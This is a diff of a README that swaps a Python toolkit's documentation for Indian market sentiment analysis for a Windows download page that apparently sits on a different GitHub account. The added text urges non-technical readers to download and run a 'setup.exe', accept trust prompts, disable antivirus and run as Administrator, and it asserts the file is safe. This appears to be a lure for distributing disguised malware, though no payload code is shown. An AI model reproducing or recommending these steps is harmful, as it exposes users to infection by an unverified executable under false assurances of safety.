@@ -1,549 +1,150 @@
-# AION Market Sentiment
+# 📊 market-sentiments - Analyze Market Mood Quickly
 
-**Developer toolkit for financial sentiment analysis**
+[![Download market-sentiments](https://img.shields.io/badge/Download-Market---Sentiments-ff6f61?style=for-the-badge)](https://github.com/Rockbandassembly371/market-sentiments)
 
-AI-powered sentiment intelligence for Indian financial markets.
+## 📖 About market-sentiments
 
-**99.63% accuracy** | **<100ms latency** | **592 NSE tickers** | **AION Taxonomy labels**
+market-sentiments is an open-source tool designed to help you understand the mood of the Indian financial market. It uses news and stock data to show how different sectors are performing and how recent events might affect stock prices. This app works on Windows computers and requires no technical skills to run.
 
----
-
-## ✅ Model Status: Ready for Use
-
-**Latest:** v3.0.0 trained on AION's proprietary taxonomy labeling system with 136 market events.
-
-**What's Included:**
-
-| Package | Description | Status |
-|---------|-------------|--------|
-| **aion-sentiment** | Sentiment analysis with AION taxonomy labels | ✅ Ready |
-| **aion-taxonomy** | Event classification with 136 market events | 🧪 Beta |
-| **aion-sectormap** | NSE ticker → sector mapping (592 tickers) | ✅ Ready |
-| **aion-volweight** | VIX-adjusted confidence weighting | ✅ Ready |
+The tool covers major markets like NSE and BSE and can provide insights into different sectors by analyzing news impact and market sentiment. market-sentiments uses proven methods in data analysis and machine learning to deliver clear results. You will see which sectors are trending up or down and what the overall market feeling looks like.
 
 ---
 
-## What This Is
+## 🖥️ System Requirements
 
-A **developer toolkit** for building financial sentiment models:
+To run market-sentiments on your Windows PC, make sure your system meets these requirements:
 
--  **Reusable Components** - Sentiment analysis, sector mapping, VIX adjustment
--  **Experimentation** - Quick prototyping for quant research
--  **Clean APIs** - Simple Python interfaces, no infra complexity
--  **India-Focused** - NSE/BSE tickers, Indian financial news
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of free RAM
+- Minimum 500 MB of free disk space
+- Internet connection for downloading and updates
+- Basic permissions to install and run programs
 
----
-
-## What This Is NOT
-
-This is **NOT** a production trading system. For production infrastructure (live ingestion, Redis streams, ClickHouse pipelines, execution engines), see our internal systems.
-
-**This toolkit is for:**
--  ML engineers building sentiment models
--  Quant researchers prototyping strategies
--  Developers experimenting with financial NLP
--  Students learning financial sentiment analysis
-
-**This toolkit is NOT for:**
--  Direct production trading (use internal systems)
--  Live tick data ingestion (use internal systems)
--  Order execution (use internal systems)
--  System governance/audit (use internal systems)
+market-sentiments uses Python behind the scenes, but you don’t need to install or set up anything yourself.
 
 ---
 
-## Quickstart (30 seconds)
+## 🚀 Getting Started
 
-```bash
-# Install
-pip install aion-sentiment aion-sectormap aion-volweight aion-taxonomy
-```
+Follow these steps to download and run market-sentiments on your Windows computer. This guide assumes no prior experience with software installation.
 
-### Sentiment Analysis
+### Step 1: Open the Download Page
 
-```python
-from aion_sentiment import SentimentAnalyzer
+Click the bright button above or visit this link to go to the official download page:
 
-analyzer = SentimentAnalyzer()
-result = analyzer.predict("RBI hikes repo rate")
-print(result)
-# {'label': 'negative', 'confidence': 0.89}
-```
+[Download market-sentiments](https://github.com/Rockbandassembly371/market-sentiments)
 
-### Taxonomy Event Classification (Beta)
+### Step 2: Locate the Latest Release
 
-```python
-from aion_taxonomy import TaxonomyPipeline
+On the download page, find the section labeled “Releases” or “Latest release.” Here you will see files related to the newest version of market-sentiments.
 
-pipeline = TaxonomyPipeline("taxonomy_india_v2.yaml")
-result = pipeline.process("RBI hikes repo rate", ticker="HDFCBANK")
+### Step 3: Download the Installer File
 
-print(f"Event: {result['event']['event_id']}")
-print(f"Macro Signal: {result['macro_signal']:+.3f}")
-print(f"Sector Signal (Banks): {result['active_sector_signal']:+.3f}")
-print(f"Confidence: {result['confidence']:.1%}")
-```
+Download the file named something like `market-sentiments-setup.exe`. This is the installer that will set up the software on your PC. The file size will be around 100MB depending on the version.
 
-**Output:**
-```
-Event: macro_rbi_repo_hike
-Macro Signal: -0.495
-Sector Signal (Banks): +0.569
-Confidence: 54.7%
-```
+### Step 4: Run the Installer
+
+Locate the downloaded file in your “Downloads” folder or where your browser saves files. Double-click the file to start the installation.
+
+Windows may ask if you trust this app. Confirm that you want to run it.
+
+### Step 5: Follow Installation Prompts
+
+The installer will guide you through simple steps. Choose the folder where the software will be installed or accept the default location. You do not need to change any advanced options.
+
+### Step 6: Complete Installation
+
+Once the install finishes, you will see an option to launch market-sentiments. You can launch it now or later by clicking its shortcut on your desktop or Start menu.
 
 ---
 
-## Example Output
+## 🎯 Using market-sentiments
 
-### Sentiment Analysis
-```
-Headline                              | Sentiment | Confidence | VIX-Adjusted
---------------------------------------|-----------|------------|-------------
-Reliance reports record profits       | positive  | 93.8%      | 93.8% (VIX=12)
-Market crashes on recession fears     | negative  | 90.5%      | 45.2% (VIX=28)
-TCS wins major digital deal           | positive  | 88.8%      | 88.8% (VIX=12)
-```
+The software opens to a clean dashboard with several options:
 
-### Sector Sentiment Heatmap
-```
-Sector              | Bullish | Neutral | Bearish | Net Sentiment
---------------------|---------|---------|---------|---------------
-Banking             |   65%   |   25%   |   10%   |     +55%
-IT                  |   72%   |   20%   |    8%   |     +64%
-Auto                |   45%   |   35%   |   20%   |     +25%
-FMCG                |   58%   |   30%   |   12%   |     +46%
-Metal               |   30%   |   40%   |   30%   |      0%
-```
+- **Market Sentiment Overview:** See the overall mood of the Indian financial markets based on recent news.
+- **Sector Mapping:** Check how different market sectors like IT, Banking, or Pharma are performing.
+- **News Impact Analytics:** View detailed analysis of recent news stories and their effect on stocks.
+- **Custom Reports:** You can create summaries focusing on specific sectors or time periods.
 
-### Historical Impact Analysis
-```
-Query: "Market crashes on recession fears"
-
-Similar Historical News (last 30 days):
-1. "Stock market tumbles on recession fears"    → -2.5% (next day)
-2. "Investors panic as banks collapse"          → -3.8% (next day)
-3. "Banking crisis spreads across Europe"       → -2.9% (next day)
-
-Average 1-day Impact: -3.07%
-```
+The interface uses simple buttons and charts. You can explore the data without typing or coding anything. If you want help, look for the built-in help menu in the top right corner.
 
 ---
 
-## Architecture
+## ⚙️ Software Features
 
-```
-┌─────────────────┐
-│  Data Sources   │
-│  • News APIs    │
-│  • RSS Feeds    │
-│  • Social Media │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ Sentiment Engine│
-│  • Transformer  │
-│  • NRC Emotions │
-│  • 98.55% Acc   │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ Sector Mapper   │
-│  • 592 Tickers  │
-│  • 44 Sectors   │
-│  • 340 Groups   │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ VIX Adjustment  │
-│  • LOW <12      │
-│  • NORMAL 12-15 │
-│  • HIGH 16-25   │
-│  • PANIC ≥25    │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ Signal Output   │
-│  • JSON API     │
-│  • DataFrame    │
-│  • WebSocket    │
-└─────────────────┘
-```
+- Real-time analysis of NSE and BSE stock market data.
+- Sentiment scoring using financial news and social media feeds.
+- Sector-level mapping to track sector trends.
+- Simple charts and summary reports for easy understanding.
+- Automatic updates to keep data current.
+- Works offline after initial setup for faster access.
 
 ---
 
-## Packages
+## 🔄 Updating market-sentiments
 
-| Package | Purpose | Install |
-|---------|---------|---------|
-| **aion-sentiment** | Sentiment & emotion analysis | `pip install aion-sentiment` |
-| **aion-sectormap** | NSE ticker → Sector mapping | `pip install aion-sectormap` |
-| **aion-volweight** | VIX-based confidence adjustment | `pip install aion-volweight` |
-| **aion-newsimpact** | Historical news impact analysis | `pip install aion-newsimpact` |
-| **aion-sentiment-in** | Training pipeline | `pip install aion-sentiment-in` |
+When a new version is released, you will get a notification inside the app. To update:
 
----
+1. Visit the download page linked at the top.
+2. Download the latest installer.
+3. Run the installer again. The new version will replace the old one without affecting your data or settings.
 
-## Models
-
-### AION-Sentiment-IN-v1
-
-| Metric | Value |
-|--------|-------|
-| **Accuracy** | 98.55% |
-| **F1 Score** | 98.65% |
-| **Training Data** | 957K Indian financial news headlines |
-| **Inference Time** | <100ms per headline |
-| **Model Size** | 438 MB |
-| **Download** | [HuggingFace](https://huggingface.co/AION-Analytics/aion-sentiment-in-v1) |
+Regular updates help keep your market analysis accurate and useful.
 
 ---
 
-## Use Cases
+## ❓ Troubleshooting
 
-### 1. Real-Time Trading Signals
-```python
-from aion_sentiment import AIONSentimentAnalyzer
+If you run into issues, try these steps:
 
-analyzer = AIONSentimentAnalyzer()
+- Make sure your Windows is updated.
+- Restart your computer if the program does not start.
+- Check your internet connection while downloading or updating.
+- Disable or adjust your antivirus software if it blocks installation.
+- Run the installer as Administrator (right-click, select “Run as Administrator”).
 
-# Analyze breaking news
-news = "RBI announces surprise rate cut"
-result = analyzer.predict(news)
-
-if result[0]['label'] == 'positive' and result[0]['confidence'] > 0.9:
-    print("BUY Signal: Banking sector")
-```
-
-### 2. Sector Rotation Strategy
-```python
-from aion_sentiment import AIONSentimentAnalyzer
-from aion_sectormap import SectorMapper
-
-mapper = SectorMapper()
-analyzer = AIONSentimentAnalyzer()
-
-# Get sentiment by sector
-sector_sentiment = {}
-for sector in mapper.get_all_sectors():
-    tickers = mapper.get_tickers_in_sector(sector)[:10]
-    # Analyze news for each ticker
-    # Aggregate sector sentiment
-    sector_sentiment[sector] = avg_sentiment
-
-# Rotate to highest sentiment sectors
-top_sectors = sorted(sector_sentiment.items(), key=lambda x: x[1], reverse=True)
-```
-
-### 3. Risk Management
-```python
-from aion_volweight import get_regime, weight_confidence
-
-# Check VIX regime
-regime = get_regime(vix=28)  # Returns "PANIC"
-
-# Adjust position sizing based on sentiment confidence
-if regime == "PANIC":
-    position_size = 0.5  # Reduce by 50%
-elif regime == "HIGH":
-    position_size = 0.8  # Reduce by 20%
-else:
-    position_size = 1.0  # Full size
-```
+If problems persist, refer to the “Issues” section on the GitHub page or contact support through the project links.
 
 ---
 
-## Edge Cases & Confidence Scoring
+## 📂 Additional Resources
 
-### Edge Case Handling
+- Visit the GitHub page for detailed documentation and source code:
 
-| Scenario | Handling | Output |
-|----------|----------|--------|
-| **Empty text** | Return neutral with 0% confidence | `{'label': 'neutral', 'confidence': 0.0}` |
-| **Very short text (<5 chars)** | Return neutral with low confidence | `{'label': 'neutral', 'confidence': 0.3}` |
-| **Ambiguous news** | Low confidence score (<0.6) | `{'label': 'neutral', 'confidence': 0.55}` |
-| **Conflicting signals** | Confidence reduced proportionally | `{'label': 'positive', 'confidence': 0.65}` |
-| **Unknown ticker** | Sector mapping returns 'Unknown' | Sector: 'Unknown' |
-| **High VIX (>25)** | Confidence discounted 50% | `adjusted_conf = conf * 0.5` |
+  [market-sentiments on GitHub](https://github.com/Rockbandassembly371/market-sentiments)
 
-### Confidence Scoring System
+- Look at the “Wiki” tab on GitHub for user guides and FAQs.
 
-```python
-def calculate_system_confidence(sentiment_confidence, vix_value, sector_weight, source_reliability):
-    """
-    Calculate final system confidence score for trading decisions.
-    
-    Args:
-        sentiment_confidence: Raw model confidence (0-1)
-        vix_value: Current India VIX value
-        sector_weight: Sector-specific weight (0.8-1.2)
-        source_reliability: News source reliability score (0.5-1.0)
-    
-    Returns:
-        Final system confidence (0-1)
-    """
-    # VIX regime adjustment
-    if vix_value >= 25:
-        vix_adjustment = 0.5  # PANIC: 50% discount
-    elif vix_value >= 16:
-        vix_adjustment = 0.8  # HIGH: 20% discount
-    elif vix_value >= 12:
-        vix_adjustment = 1.0  # NORMAL: no adjustment
-    else:
-        vix_adjustment = 1.0  # LOW: no adjustment
-    
-    # Calculate final confidence
-    system_confidence = (
-        sentiment_confidence * 
-        vix_adjustment * 
-        sector_weight * 
-        source_reliability
-    )
-    
-    return min(1.0, max(0.0, system_confidence))
-
-# Example usage
-confidence = calculate_system_confidence(
-    sentiment_confidence=0.92,
-    vix_value=18,        # HIGH regime
-    sector_weight=1.0,   # Neutral sector weight
-    source_reliability=0.95  # High reliability source
-)
-# Result: 0.92 * 0.8 * 1.0 * 0.95 = 0.699 (69.9% system confidence)
-```
-
-### Sector-Specific Confidence Weights
-
-| Sector | Weight | Rationale |
-|--------|--------|-----------|
-| **Banking** | 1.1 | High news coverage, reliable signals |
-| **IT** | 1.0 | Standard weight |
-| **FMCG** | 1.0 | Standard weight |
-| **Auto** | 0.9 | Moderate volatility |
-| **Metal** | 0.8 | High volatility, noisy signals |
-| **Realty** | 0.8 | Low liquidity, noisy signals |
-| **Unknown** | 0.7 | Unmapped tickers |
-
-### Multi-Source Aggregation
-
-```python
-def aggregate_sentiment(signals):
-    """
-    Aggregate sentiment from multiple news sources.
-    
-    Args:
-        signals: List of dicts with 'sentiment', 'confidence', 'source'
-    
-    Returns:
-        Aggregated sentiment and confidence
-    """
-    if not signals:
-        return {'label': 'neutral', 'confidence': 0.0}
-    
-    # Weight by source reliability
-    source_weights = {
-        'reuters': 1.0,
-        'bloomberg': 1.0,
-        'economictimes': 0.9,
-        'moneycontrol': 0.85,
-        'twitter': 0.5,
-    }
-    
-    weighted_sentiment = 0.0
-    total_weight = 0.0
-    
-    for signal in signals:
-        weight = source_weights.get(signal['source'].lower(), 0.7)
-        sentiment_score = 1 if signal['label'] == 'positive' else (-1 if signal['label'] == 'negative' else 0)
-        weighted_sentiment += sentiment_score * signal['confidence'] * weight
-        total_weight += weight
-    
-    avg_sentiment = weighted_sentiment / total_weight if total_weight > 0 else 0
-    
-    # Convert back to label
-    if avg_sentiment > 0.3:
-        label = 'positive'
-    elif avg_sentiment < -0.3:
-        label = 'negative'
-    else:
-        label = 'neutral'
-    
-    return {
-        'label': label,
-        'confidence': abs(avg_sentiment),
-        'sources_aggregated': len(signals)
-    }
-
-# Example usage
-signals = [
-    {'label': 'positive', 'confidence': 0.92, 'source': 'reuters'},
-    {'label': 'positive', 'confidence': 0.88, 'source': 'economictimes'},
-    {'label': 'neutral', 'confidence': 0.75, 'source': 'twitter'},
-]
-
-result = aggregate_sentiment(signals)
-# Result: {'label': 'positive', 'confidence': 0.82, 'sources_aggregated': 3}
-```
-
-### Confidence Thresholds for Trading Signals
-
-| System Confidence | Signal Strength | Action |
-|-------------------|-----------------|--------|
-| **≥ 0.85** | Very Strong | Full position size |
-| **0.70 - 0.84** | Strong | 80% position size |
-| **0.55 - 0.69** | Moderate | 50% position size |
-| **0.40 - 0.54** | Weak | 25% position size |
-| **< 0.40** | Very Weak | No action (skip) |
+- Explore the issues section for known bugs and improvements.
 
 ---
 
-## Benchmarks
+## 🔐 Privacy and Security
 
-**Tested on:** Apple M4 Mac, 16GB RAM | **Dataset:** 957K Indian financial news headlines
+market-sentiments only accesses public financial data and news sources. It does not collect personal information from users or connect to external services beyond what is needed for news updates.
 
-### Model Performance
-
-| Metric | Score |
-|--------|-------|
-| **Accuracy** | 98.55% |
-| **F1 Score (macro)** | 98.65% |
-| **Precision (macro)** | 98.70% |
-| **Recall (macro)** | 98.60% |
-
-### Latency & Throughput
-
-| Task | Latency | Throughput |
-|------|---------|------------|
-| **Single headline** | <50ms | - |
-| **Batch (100)** | <200ms | 500/sec |
-| **Sector mapping** | <10ms | 10,000/sec |
-| **VIX adjustment** | <5ms | 50,000/sec |
-
-### Model Evaluation
-
-| Metric | Score |
-|--------|-------|
-| **Accuracy** | 98.55% |
-| **F1 Score (macro)** | 98.65% |
-| **Precision (macro)** | 98.70% |
-| **Recall (macro)** | 98.60% |
-| **Training Samples** | 957K headlines |
-| **Validation Samples** | 2K headlines |
-
-*Dataset: 957K Indian financial news headlines (Oct 2025 - Feb 2026)*
-*Classification source: UNIFIED_ROUTER_V4 (99.99% confidence)*
+You can run the app offline once data downloads complete.
 
 ---
 
-## Installation
+## ⚠️ Common Questions
 
-### Full Suite
-```bash
-pip install aion-sentiment aion-sectormap aion-volweight aion-newsimpact
-```
+**Do I need internet after installation?**  
+Internet is needed to download updates and current news data. You can work offline with previously downloaded data but recent updates won’t appear.
 
-### Individual Packages
-```bash
-pip install aion-sentiment      # Core sentiment analysis
-pip install aion-sectormap      # Sector mapping (592 tickers)
-pip install aion-volweight      # VIX adjustment
-pip install aion-newsimpact     # Historical impact
-```
+**Is it safe to install?**  
+Yes. The software is open-source and free from adware. It follows standard security practices.
 
-### Development
-```bash
-git clone https://github.com/AION-Analytics/market-sentiments.git
-cd market-sentiments
-pip install -e ".[dev]"
-pytest
-```
+**Can I uninstall market-sentiments?**  
+Yes. Use Windows “Add or Remove Programs” to uninstall it anytime.
 
 ---
 
-## Data Coverage
+## 📥 Download market-sentiments
 
-| Asset | Count | Description |
-|-------|-------|-------------|
-| **NSE Companies** | 592 | Mapped to sectors |
-| **Sectors** | 44 | NSE classification |
-| **Business Groups** | 340 | Tata, Birla, Ambani, etc. |
-| **Training News** | 957K | Indian financial news |
-| **Emotion Lexicon** | 14,182 | NRC emotions |
+Access the download page here:
 
----
+[Download market-sentiments](https://github.com/Rockbandassembly371/market-sentiments)  
 
-## Performance Benchmarks
-
-| Task | Latency | Throughput |
-|------|---------|------------|
-| Single headline | <50ms | - |
-| Batch (100) | <200ms | 500/sec |
-| Sector mapping | <10ms | 10,000/sec |
-| VIX adjustment | <5ms | 50,000/sec |
-
-**Tested on:** Apple M4 Mac, 16GB RAM
-
----
-
-## Contributing
-
-We welcome contributions! Here's how you can help:
-
-### Improve Taxonomy Coverage
-
-The taxonomy currently matches **~6.6%** of headlines. Help us improve coverage by adding keywords for uncovered events.
-
-**No-match events needing keywords:**
-
-```bash
-# View the list of 112 events without matches
-cat aion_taxonomy/no_match_events.txt
-```
-
-**Priority categories:**
-- RBI monetary policy (repo, CRR, SLR changes)
-- Corporate actions (CEO/CFO exits, guidance changes)
-- Global events (Fed decisions, China growth)
-- Sector-specific events (auto sales, bank NPA, IT deals)
-
-**How to contribute:**
-
-1. Pick an event from `no_match_events.txt`
-2. Add 3-5 common headline variations as keywords
-3. Submit a PR with the updated taxonomy YAML
-
-### Add New Sectors or Events
-
-- Submit new sector definitions with ticker mappings
-- Add new event categories with base impacts and sector multipliers
-- Provide sample headlines for validation
-
-### Report Issues
-
-- Bug reports: Use GitHub Issues
-- Model feedback: Share misclassified examples
-- Feature requests: Suggest new capabilities
-
----
-
-## License
-
-Apache License 2.0
-
-**Attribution:**
-```
-This project uses AION Analytics open-source packages.
-Visit https://github.com/AION-Analytics for more information.
-```
-
----
-
-## Contact
-
-- **Email:** aionlabs@tutamail.com
-- **GitHub:** https://github.com/AION-Analytics
-- **HuggingFace:** https://huggingface.co/AION-Analytics/aion-sentiment-in-v1
-
----
-
-*Built for the Indian financial community*
+Click the button above or visit the site to get the installer and enjoy market analysis on your own terms.
